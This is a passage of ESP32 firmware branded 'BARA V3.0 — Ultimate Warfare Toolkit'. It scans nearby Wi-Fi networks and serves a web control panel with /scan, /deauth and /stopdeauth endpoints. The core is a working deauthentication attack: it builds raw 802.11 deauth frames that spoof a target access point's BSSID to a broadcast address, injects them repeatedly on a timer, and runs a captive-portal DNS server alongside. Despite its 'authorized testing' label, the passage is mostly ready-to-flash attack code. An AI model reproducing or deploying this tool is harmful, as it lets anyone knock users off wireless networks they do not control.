        net["bssid"] = WiFi.BSSIDstr(i);
        net["ssid"] = WiFi.SSID(i).length() > 0 ? WiFi.SSID(i) : "";
        net["rssi"] = WiFi.RSSI(i);
        net["channel"] = WiFi.channel(i);
        net["encryption"] = WiFi.encryptionType(i);
        
        // Store for quick access
        if (i < MAX_NETWORKS) {
            networks[i].bssid = WiFi.BSSIDstr(i);
            networks[i].ssid = WiFi.SSID(i);
            networks[i].rssi = WiFi.RSSI(i);
            networks[i].channel = WiFi.channel(i);
            networks[i].encryption = WiFi.encryptionType(i);
        }
    }
    
    String json;
    serializeJson(doc, json);
    
    WiFi.scanDelete();
    scanInProgress = false;
    
    return json;
}

// ==================== ⚡ ADVANCED DEAUTH PACKET INJECTION ====================
void sendDeauthFrame(const uint8_t* bssid, uint8_t reason = DEAUTH_REASON) {
    // Deauth frame structure (802.11)
    uint8_t packet[26] = {
        0xC0, 0x00,                         // Frame Control: Deauthentication
        (DEAUTH_DURATION & 0xFF),           // Duration (low byte)
        (DEAUTH_DURATION >> 8),             // Duration (high byte)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
        bssid[0], bssid[1], bssid[2],       // Source: Target AP
        bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2],       // BSSID: Target AP
        bssid[3], bssid[4], bssid[5],
        0x00, 0x00,                         // Sequence/Fragment
        reason, 0x00                        // Reason code
    };
    
    // Send raw 802.11 frame
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    
    if (result == ESP_OK) {
        deauthPacketCount++;
        totalPacketsSent++;
    }
}

// ==================== 🌐 WEB SERVER SETUP ====================
void setupWebServer() {
    // Serve main page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    // Network scan endpoint
    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
        String json = scanWiFiNetworksJSON();
        request->send(200, "application/json", json);
    });
    
    // Start deauth attack
    server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!request->hasParam("bssid")) {
            request->send(400, "text/plain", "ERROR: BSSID parameter required");
            return;
        }
        
        String bssid = request->getParam("bssid")->value();
        bssid.toUpperCase();
        
        if (!isValidBSSID(bssid)) {
            request->send(400, "text/plain", "ERROR: Invalid BSSID format");
            return;
        }
        
        if (!parseMACAddress(bssid, deauthTargetMAC)) {
            request->send(400, "text/plain", "ERROR: Failed to parse BSSID");
            return;
        }
        
        deauthTargetBSSID = bssid;
        deauthActive = true;
        deauthPacketCount = 0;
        lastDeauthTime = millis();
        
        Serial.println("🔥 DEAUTH ATTACK STARTED: " + bssid);
        request->send(200, "text/plain", "⚡ DEAUTH ATTACK INITIATED ON: " + bssid);
    });
    
    // Stop deauth attack
    server.on("/stopdeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (deauthActive) {
            deauthActive = false;
            Serial.println("⏹ Deauth attack stopped");
            Serial.printf("📊 Packets sent: %lu\n", deauthPacketCount);
            request->send(200, "text/plain", "✅ DEAUTH ATTACK STOPPED — " + String(deauthPacketCount) + " packets sent");
        } else {
            request->send(200, "text/plain", "ℹ️ No active attack to stop");
        }
    });
    
    // Status endpoint
    server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request) {
        DynamicJsonDocument status(512);
        status["deauthActive"] = deauthActive;
        status["target"] = deauthActive ? deauthTargetBSSID : "";
        status["packetCount"] = totalPacketsSent;
        status["uptime"] = uptimeSeconds;
        
        String json;
        serializeJson(status, json);
        request->send(200, "application/json", json);
    });
    
    // 404 handler
    server.onNotFound([](AsyncWebServerRequest *request) {
        request->send(404, "text/plain", "404: Not Found");
    });
    
    server.begin();
    Serial.println("✅ Web server started");
}

// ==================== 🧪 SYSTEM INITIALIZATION ====================
void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n\n");
    Serial.println("╔═══════════════════════════════════════════════════════════╗");
    Serial.println("║   🩸 B A R A  V3.0 — ULTIMATE WARFARE TOOLKIT 🩸        ║");
    Serial.println("║   Advanced ESP32 Wi-Fi Penetration Testing System        ║");
    Serial.println("║   Developed by: Ahmed Nour Ahmed | Qena, Egypt           ║");
    Serial.println("╚═══════════════════════════════════════════════════════════╝");
    Serial.println();
    
    // Initialize Wi-Fi in AP + STA mode for better control
    WiFi.mode(WIFI_AP_STA);
    
    // Configure and start Access Point
    Serial.println("🔧 Configuring Access Point...");
    WiFi.softAP(AP_SSID, AP_PASS, 1, 0, 4);  // Channel 1, no hidden, max 4 clients
    WiFi.softAPdisconnect(false);
    
    IPAddress IP = WiFi.softAPIP();
    Serial.print("✅ AP IP Address: ");
    Serial.println(IP);
    Serial.printf("📡 SSID: %s\n", AP_SSID);
    Serial.printf("🔐 Password: %s\n", AP_PASS);
    
    // Enable promiscuous mode for packet injection
    Serial.println("🔓 Enabling promiscuous mode...");
    esp_wifi_set_promiscuous(true);
    
    // Start DNS server (Captive Portal)
    Serial.println("🌐 Starting DNS server...");
    dnsServer.start(53, "*", IP);
    
    // Initialize web server
    Serial.println("🖥️ Starting web server...");
    setupWebServer();
    
    Serial.println();
    Serial.println("═══════════════════════════════════════════════════════════");
    Serial.println("✅ BARA V3.0 IS LIVE AND READY FOR AUTHORIZED TESTING!");
    Serial.println("═══════════════════════════════════════════════════════════");
    Serial.println();
    Serial.printf("🌐 Connect to: %s\n", AP_SSID);
    Serial.printf("🔗 Navigate to: http://%s\n", IP.toString().c_str());
    Serial.println();
}

// ==================== 🔁 MAIN LOOP ====================
void loop() {
    // Process DNS requests
    dnsServer.processNextRequest();
    
    // Execute deauth attack if active
    if (deauthActive && (millis() - lastDeauthTime >= DEAUTH_INTERVAL_MS)) {
        sendDeauthFrame(deauthTargetMAC, DEAUTH_REASON);
        lastDeauthTime = millis();
        
        // Log every 100 packets
        if (deauthPacketCount % 100 == 0) {
            Serial.printf("⚡ Deauth packets sent: %lu (Total: %lu)\n", 
                         deauthPacketCount, totalPacketsSent);
        }
    }
    
    // Update uptime counter every second
    static unsigned long lastUptimeUpdate = 0;
    if (millis() - lastUptimeUpdate >= 1000) {
        uptimeSeconds++;
        lastUptimeUpdate = millis();
    }
    
    // Yield to system tasks
    yield();
}
